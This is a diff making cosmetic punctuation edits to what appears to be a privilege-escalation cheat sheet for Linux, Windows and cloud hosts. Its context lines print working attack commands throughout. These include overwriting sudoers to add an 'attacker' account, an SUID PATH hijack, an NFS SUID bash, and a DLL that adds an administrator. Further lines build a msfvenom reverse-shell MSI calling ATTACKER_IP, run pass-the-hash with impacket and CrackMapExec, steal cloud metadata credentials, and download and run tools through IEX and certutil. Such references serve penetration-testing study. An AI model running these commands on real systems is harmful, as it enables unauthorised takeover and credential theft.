@@ -215,11 +215,11 @@ sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
 # NOPASSWD find
 sudo find / -exec /bin/bash \; -quit
 
-# NOPASSWD cp — overwrite /etc/sudoers
+# NOPASSWD cp: overwrite /etc/sudoers
 echo "attacker ALL=(ALL) NOPASSWD:ALL" > /tmp/sudoers
 sudo cp /tmp/sudoers /etc/sudoers
 
-# NOPASSWD tee — append to /etc/sudoers
+# NOPASSWD tee: append to /etc/sudoers
 echo "attacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
 
 # Wildcard abuse: (root) NOPASSWD: /opt/scripts/*.sh
@@ -294,7 +294,7 @@ chmod +x /tmp/service
 # Prepend the writable directory to PATH
 export PATH=/tmp:$PATH
 
-# Run the SUID binary — it picks up /tmp/service instead
+# Run the SUID binary: it picks up /tmp/service instead
 /usr/local/bin/suid-binary
 ```
 
@@ -309,9 +309,9 @@ Capabilities grant specific elevated privileges to binaries without full SUID. F
 getcap -r / 2>/dev/null
 
 # Common dangerous capabilities
-# cap_setuid+ep  — can set UID to 0
-# cap_dac_read_search — bypass file read permission checks
-# cap_net_raw    — raw socket access
+# cap_setuid+ep  : can set UID to 0
+# cap_dac_read_search: bypass file read permission checks
+# cap_net_raw    : raw socket access
 ```
 
 Exploitation (`cap_setuid+ep` on Python/Perl/Ruby):
@@ -404,11 +404,11 @@ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
 When an NFS share is exported with `no_root_squash`, a remote root user retains root privileges on the mount. This allows placing a SUID root binary on the share.
 
 ```bash
-# On target — find NFS exports
+# On target: find NFS exports
 cat /etc/exports
 showmount -e localhost
 
-# On attacker machine — mount the share as root
+# On attacker machine: mount the share as root
 mkdir /tmp/nfs
 mount -o rw,vers=3 TARGET_IP:/shared /tmp/nfs
 
@@ -416,7 +416,7 @@ mount -o rw,vers=3 TARGET_IP:/shared /tmp/nfs
 cp /bin/bash /tmp/nfs/bash
 chmod +s /tmp/nfs/bash
 
-# On target — execute the SUID bash
+# On target: execute the SUID bash
 /shared/bash -p
 # -p preserves effective UID (root)
 ```
@@ -438,9 +438,9 @@ cat /proc/version
 ./les.sh
 
 # Notable kernel exploits
-# DirtyCOW (CVE-2016-5195)   — kernel 2.6.22–4.8.3
-# Dirty Pipe (CVE-2022-0847) — kernel 5.8–5.16.11
-# PwnKit (CVE-2021-4034)     — pkexec SUID privesc, glibc-based systems
+# DirtyCOW (CVE-2016-5195)   : kernel 2.6.22–4.8.3
+# Dirty Pipe (CVE-2022-0847): kernel 5.8–5.16.11
+# PwnKit (CVE-2021-4034)     : pkexec SUID privesc, glibc-based systems
 ```
 
 DirtyCOW (CVE-2016-5195):
@@ -611,7 +611,7 @@ Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name Alway
 Exploitation:
 
 ```bash
-# On Kali — generate malicious MSI with msfvenom
+# On Kali: generate malicious MSI with msfvenom
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
 
 # Start listener
@@ -619,7 +619,7 @@ nc -lvnp 4444
 ```
 
 ```cmd
-:: On target — install the MSI (runs as SYSTEM)
+:: On target; install the MSI (runs as SYSTEM)
 msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
@@ -651,12 +651,12 @@ Filter:
 Compile a malicious DLL (Windows C example):
 
 ```c
-// evil.c — compiled with MinGW or MSVC
+// evil.c: compiled with MinGW or MSVC
 #include <windows.h>
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        // Add attacker account with static args — no user-controlled input
+        // Add attacker account with static args: no user-controlled input
         WinExec("net localgroup administrators attacker /add", SW_HIDE);
     }
     return TRUE;
@@ -782,7 +782,7 @@ GodPotato -cmd "cmd /c net localgroup administrators attacker /add"
 :: List all scheduled tasks
 schtasks /query /fo LIST /v
 
-:: PowerShell — find tasks pointing to non-Microsoft binaries
+:: PowerShell, find tasks pointing to non-Microsoft binaries
 Get-ScheduledTask |
   Where-Object {$_.TaskPath -notlike "\Microsoft*"} |
   Select-Object TaskName,TaskPath,@{N='Action';E={$_.Actions.Execute}}
@@ -850,10 +850,10 @@ impacket-psexec DOMAIN/Administrator@TARGET_IP -hashes aad3b435b51404eeaad3b435b
 # impacket-wmiexec
 impacket-wmiexec DOMAIN/Administrator@TARGET_IP -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
 
-# CrackMapExec — spray across subnet
+# CrackMapExec: spray across subnet
 crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
 
-# CrackMapExec — execute command
+# CrackMapExec: execute command
 crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH -x "whoami"
 
 # Evil-WinRM
@@ -1015,13 +1015,13 @@ cat output.txt
 EC2 instance metadata (retrieve IAM role credentials):
 
 ```bash
-# From inside an EC2 instance — IMDSv1 (no token required)
+# From inside an EC2 instance: IMDSv1 (no token required)
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
 # List the role name, then retrieve credentials
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
 
-# IMDSv2 (token required — default since 2021)
+# IMDSv2 (token required: default since 2021)
 TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
   -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 curl -H "X-aws-ec2-metadata-token: $TOKEN" \
@@ -1052,7 +1052,7 @@ Azure privilege escalation typically involves abusing Azure RBAC role assignment
 Enumerate current identity and roles:
 
 ```bash
-# Azure CLI — current identity
+# Azure CLI: current identity
 az account show
 az ad signed-in-user show
 
@@ -1088,7 +1088,7 @@ az role assignment create \
 Azure Managed Identity abuse (from a VM):
 
 ```bash
-# From inside an Azure VM — query IMDS for access token
+# From inside an Azure VM: query IMDS for access token
 curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
   -H 'Metadata: true'
 
@@ -1237,7 +1237,7 @@ gcloud auth print-access-token --impersonate-service-account PRIVILEGED_SA@PROJE
 | CloudSploit | Multi-cloud | [github.com/aquasecurity/cloudsploit](https://github.com/aquasecurity/cloudsploit): misconfiguration scanner |
 
 ```bash
-# linPEAS — full run with color output
+# linPEAS: full run with color output
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.out
 
 # Transfer winPEAS to target via Python HTTP server
@@ -1249,7 +1249,7 @@ python3 -m http.server 8080
 certutil -urlcache -f http://ATTACKER_IP:8080/winpeas.exe C:\Temp\winpeas.exe
 C:\Temp\winpeas.exe
 
-:: PowerUp — download and run
+:: PowerUp, download and run
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/PowerUp.ps1'); Invoke-AllChecks"
 ```
 
